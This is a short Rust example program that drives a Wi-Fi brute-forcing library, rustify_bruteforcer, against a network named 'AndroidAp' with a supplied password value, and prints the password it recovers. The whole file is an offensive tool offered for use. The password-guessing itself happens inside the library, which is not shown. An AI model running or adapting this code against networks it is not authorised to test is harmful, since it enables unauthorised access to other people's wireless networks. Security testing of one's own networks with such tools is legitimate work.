extern crate rustify_bruteforcer;

use rustify_bruteforcer::*;

fn main() {
  let config = Config::new("AndroidAp", Some("belm2453".to_string()));

  let mut bruteforcer = match WifiBruteforcer::new(config) {
    Ok(client) => client,
    Err(err) => panic!("{}", err),
  };

  match bruteforcer.perform_attack() {
    Ok(password) => println!("The password is: {}", password.unwrap()),
    Err(err) => eprintln!("{}", err),
  }
}
